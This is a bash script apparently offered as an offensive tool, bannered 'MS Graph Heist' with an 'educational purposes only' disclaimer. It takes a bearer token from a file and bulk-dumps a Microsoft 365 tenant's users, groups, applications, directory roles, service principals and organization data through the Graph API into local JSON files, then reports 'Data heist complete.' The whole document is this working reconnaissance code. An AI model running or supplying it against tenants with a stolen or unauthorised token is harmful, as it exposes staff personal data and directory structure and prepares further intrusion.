#!/bin/bash
print_ascii_art() {
    echo " ___ ___  _____      ____  ____    ____  ____  __ __      __ __    ___  ____ _____ ______ "
    echo " |   |   |/ ___/     /    ||    \  /    ||    \|  |  |    |  |  |  /  _]|    / ___/|      |"
    echo " | _   _ (   \_     |   __||  D  )|  o  ||  o  )  |  |    |  |  | /  [_  |  (   \_ |      |"
    echo " |  \_/  |\__  |    |  |  ||    / |     ||   _/|  _  |    |  _  ||    _] |  |\__  ||_|  |_|"
    echo " |   |   |/  \ |    |  |_ ||    \ |  _  ||  |  |  |  |    |  |  ||   [_  |  |/  \ |  |  |  "
    echo " |   |   |\    |    |     ||  .  \|  |  ||  |  |  |  |    |  |  ||     | |  |\    |  |  |  "
    echo " |___|___| \___|    |___,_||__|\_||__|__||__|  |__|__|    |__|__||_____||____|\___|  |__|  "
    echo "                                                                                           "
    echo "DISCLAIMER: This script is for educational purposes only."
    echo "Ensure you use this information and any scripts legally and ethically."
    echo ""
}
print_ascii_art

# Define the file containing the Bearer token
token_file="token.txt"

# Read the Bearer token from the file
if [[ -f "$token_file" ]]; then
  bearer_token=$(<"$token_file")
else
  echo "Token file not found: $token_file"
  exit 1
fi

# Define the base URL and headers
base_url="https://graph.microsoft.com/v1.0"
authorization_header="Authorization: $bearer_token"

# Define the output files
output_files=("users.json" "groups.json" "applications.json" "directory_roles.json" "service_principals.json" "organization.json")

# Define the queries
queries=(
  "$base_url/users?\$select=displayName,userPrincipalName,businessPhones,officeLocation,city,mail,jobTitle,preferredLanguage,givenName,surname,accountEnabled,assignedLicenses,createdDateTime,department,employeeId,identities,onPremisesDistinguishedName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesSecurityIdentifier,onPremisesSyncEnabled,proxyAddresses,state,streetAddress,usageLocation,userType"
  "$base_url/groups?\$select=id,displayName,description,mail,mailEnabled,mailNickname,securityEnabled,visibility,groupTypes,createdDateTime,renewedDateTime,resourceProvisioningOptions,resourceBehaviorOptions,owners,createdOnBehalfOf,groupLifecyclePolicy,assignedLicenses,licenseProcessingState"
  "$base_url/applications?\$select=id,displayName,appId,createdDateTime,identifierUris,publisherDomain,signInAudience,appRoles"
  "$base_url/directoryRoles"
  "$base_url/servicePrincipals?\$select=id,appId,displayName,servicePrincipalType,accountEnabled,createdDateTime"
  "$base_url/organization"
)

# Function to make a request and handle pagination
make_request() {
  local url=$1
  local output_file=$2
  # Initialize the output file
  echo "[]" > "$output_file"
  while [ -n "$url" ]; do
    # Make the request
    response=$(curl -s -H "$authorization_header" -H "Content-Type: application/json" "$url")
    # Save the response to a temporary file
    echo "$response" > response.json
    # Append the response to the output file, merging with previous results
    jq -s '.[0] + .[1]' "$output_file" <(jq '.value' response.json) > tmp.json && mv tmp.json "$output_file"
    # Get the next link if it exists
    url=$(jq -r '."@odata.nextLink"' response.json)
    # Add a delay to stay within rate limits
    sleep 1
  done
  # Clean up temporary files
  rm response.json
}

# Loop through the queries and make requests
for i in "${!queries[@]}"; do
  echo "Processing query $(($i + 1)) of ${#queries[@]}..."
  make_request "${queries[$i]}" "${output_files[$i]}"
  echo "Completed query $(($i + 1)) of ${#queries[@]}"
  sleep 1 # Add a delay to stay within rate limits
done

echo "Data heist complete. Results are saved in the respective files."
